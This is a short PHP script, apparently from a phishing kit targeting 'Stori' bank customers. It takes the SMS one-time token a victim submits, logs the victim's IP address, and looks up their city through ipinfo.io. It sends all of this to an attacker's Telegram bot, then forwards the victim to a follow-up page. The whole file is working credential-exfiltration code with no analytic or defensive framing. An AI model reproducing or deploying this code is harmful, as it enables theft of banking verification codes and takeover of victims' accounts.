<?php
include 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = implode('', $_POST['code'] ?? []);
    $ip   = $_SERVER['REMOTE_ADDR'];
    $hora = date('Y-m-d H:i:s');

    // Ciudad desde IP
    $ipInfo = @json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
    $ciudad = $ipInfo->city ?? 'Desconocida';
    $region = $ipInfo->region ?? '';
    $pais   = $ipInfo->country ?? '';

    $mensaje = "
📲 <b>SMS STORI</b>
🔐 <b>Token:</b> <code>$code</code>

🌐 <b>IP:</b> <code>$ip</code>
🏙️ <b>Ubicación:</b> $ciudad, $region ($pais)
🕒 <b>Hora:</b> $hora
";

    // Enviar a Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];

    file_get_contents($url . '?' . http_build_query($data));

    header('Location: sms2.html'); // Puedes redirigir a donde tú quieras
    exit;
}
?>
